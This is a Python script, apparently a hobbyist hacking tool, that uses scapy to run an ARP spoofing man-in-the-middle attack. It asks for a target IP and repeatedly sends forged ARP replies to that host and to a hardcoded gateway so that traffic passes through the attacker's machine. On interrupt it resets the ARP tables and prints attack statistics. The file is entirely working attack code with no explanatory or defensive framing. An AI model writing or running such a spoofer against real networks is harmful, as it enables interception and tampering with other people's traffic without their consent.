import time
import datetime
import pytz
import os
import scapy.all as scapy

#COLOR
os.system("clear")
red = "\033[31m"
green = "\033[32m"
yellow = "\033[33m"

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcas = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcas = broadcas / arp_request
    answared_list = scapy.srp(arp_request_broadcas, timeout=1, verbose=False)[0]
    return answared_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restart(distination_ip, source_ip):
    distination_mac = get_mac(distination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=distination_ip, hwdst=distination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

targetu_ip = input("Enter Target IP: ")#"10.0.2.25"
gateway = "10.0.2.1"

def datatimes():
    utc_now = pytz.utc.localize(datetime.datetime.utcnow())
    pst_now = utc_now.astimezone(pytz.timezone("Asia/Tashkent"))
    dt_string = pst_now.strftime("%d.%m.%Y %H:%M:%S")
    return dt_string

try:
    packet_sent_count = 0
    start_attack = datatimes()
    t1 = datetime.datetime.now()
    while True:
        spoof(targetu_ip, gateway)
        spoof(gateway, targetu_ip)
        packet_sent_count = packet_sent_count + 2
        print(f"\r[+] Packets Sent {str(packet_sent_count)}", end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("\n\033[31m[+] Detected CTRL + C ...Resetting ARP tables...Please wait.")
    packet_sent_count = packet_sent_count
    stop_attack = datatimes()
    t2 = datetime.datetime.now()
    result_duration = t2 - t1
    print("\n\033[33m[+] Work statistics:")
    print(f"\033[32m- Total ARP packets sent: {packet_sent_count}")
    print(f"- Attack start time: {start_attack}")
    print(f"- Attack end time: {stop_attack}")
    print(f"- Attack duration: {result_duration}")
    restart(targetu_ip, gateway)
    restart(gateway, targetu_ip)

datatimes()